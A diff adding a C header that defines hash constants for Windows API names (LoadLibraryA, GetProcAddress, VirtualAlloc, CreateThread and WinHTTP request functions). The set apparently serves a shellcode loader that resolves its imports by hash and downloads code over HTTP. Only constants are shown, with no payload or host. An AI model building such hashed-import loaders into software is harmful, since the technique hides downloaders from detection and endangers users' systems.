@@ -1,0 +1,18 @@
+#pragma once
+
+// 定义哈希常量
+#define HASH_KERNEL32             0x7040ee75
+#define HASH_LOADLIBRARYA         0x5fbff0fb
+#define HASH_CREATETHREAD		  0x7f08f451
+#define HASH_GETPROCADDRESS       0xcf31bb1f
+#define HASH_VIRTUALALLOC         0x382c0f97
+#define HASH_VIRTUALFREE          0x668fcf2e
+#define HASH_WINHTTP              0x920e337d
+#define HASH_WINHTTP_OPEN         0x5e4f39e5
+#define HASH_WINHTTP_CONNECT      0x7242c17d
+#define HASH_WINHTTP_OPENREQUEST  0xeab7b9ce
+#define HASH_WINHTTP_SENDREQUEST  0xb183faa6
+#define HASH_WINHTTP_RECEIVERESP  0x146c4925
+#define HASH_WINHTTP_READDATA     0x7195e4e9
+#define HASH_WINHTTP_CLOSEHANDLE  0x36220cd5
+#define HASH_WINHTTP_QUERYHEADERS 0x389cefa5
